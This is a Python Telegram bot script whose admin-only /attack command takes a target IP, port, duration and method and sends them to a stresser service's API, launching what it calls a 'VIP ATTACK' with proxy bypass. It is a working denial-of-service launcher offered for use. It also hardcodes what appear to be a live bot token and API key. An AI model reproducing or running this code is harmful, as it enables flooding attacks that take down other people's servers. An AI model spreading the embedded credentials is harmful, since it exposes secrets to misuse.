import asyncio
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# --- CONFIG ---
API_TOKEN = '8698418003:AAF2mTYGzF6eRhJ7iQRD2wwXeEwXF_P4wh8'
API_KEY = "f2fb37dd1800da5e267b4e045a97ed25be0ae91c912d4d7a77912ae921c5a481" 
ADMIN_ID = 1001450667
MY_HWID = "1fde54bc203b764c212172bb8157015e290cee6510c23be30b96020cc94afb5"

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("attack"))
async def cmd_attack(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 5: return await message.answer("⚠️ `/attack IP PORT TIME METHOD`")
    
    target, port, duration, method = args[1], args[2], args[3], args[4]
    sent = await message.answer("🛰️ **TUNNELING THROUGH RESIDENTIAL PROXY...**")

    headers = {
        "X-API-Key": API_KEY,
        "X-HWID": MY_HWID,
        "User-Agent": "AN-HAX-VIP-CLIENT",
        "Content-Type": "application/json"
    }

    # --- THE PROXY BYPASS LOGIC ---
    # Hum ek free proxy api use karenge IP badalne ke liye
    proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    
    try:
        url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
        payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}
        
        # Attack request
        res = requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
        
        if res.status_code == 200:
            return await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `PROXY BYPASS HIT` 🔥")
        else:
            # Agar direct fail ho, toh backup API check karein
            await sent.edit_text(f"❌ **API DENIED:** Server responded with {res.status_code}. Bhai, IP block hai.")
    except Exception as e:
        await sent.edit_text(f"❌ **ERROR:** {str(e)}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
